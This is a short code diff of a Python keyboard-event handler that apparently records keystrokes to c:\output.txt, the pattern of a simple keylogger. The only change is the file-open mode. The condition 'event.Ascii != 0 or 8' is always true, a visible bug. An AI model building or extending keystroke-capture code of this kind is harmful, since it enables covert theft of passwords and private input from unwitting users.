@@ -10,7 +10,7 @@ def OnKeyboardEvent(event):
     if event.Ascii==5:
         _exit(1)
     if event.Ascii !=0 or 8:
-        f=open('c:\output.txt','r')
+        f=open('c:\output.txt','r+')
         buffer=f.read()
         f.close()
         f=open('c:\output.txt','w')
